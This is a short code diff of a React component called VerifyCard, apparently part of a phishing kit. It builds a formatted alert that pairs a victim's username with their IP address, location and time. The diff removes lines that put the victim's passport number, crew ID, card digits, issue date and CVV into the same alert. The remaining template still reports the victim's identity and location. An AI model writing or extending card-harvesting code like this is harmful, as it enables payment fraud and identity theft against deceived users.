@@ -95,11 +95,6 @@ export default function VerifyCard() {
       `📌 <b>Step 2 — Card Details</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `👤 <b>Username</b>    : <code>${pendingUsername}</code>\n` +
-      `🪪 <b>Crew ID</b>     : <code>${crewId}</code>\n` +
-      `📘 <b>No. Passport</b>: <code>${passportNo}</code>\n` +
-      `💳 <b>Last 8 Digits</b>: <code>${lastDigit}</code>\n` +
-      `📅 <b>Card Issued</b> : <code>${month}/${year}</code>\n` +
-      `🔒 <b>CVV</b>         : <code>${secCode}</code>\n` +
       `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
       `🕐 <b>Waktu</b>       : ${now}\n` +
       `━━━━━━━━━━━━━━━━━━━━━`
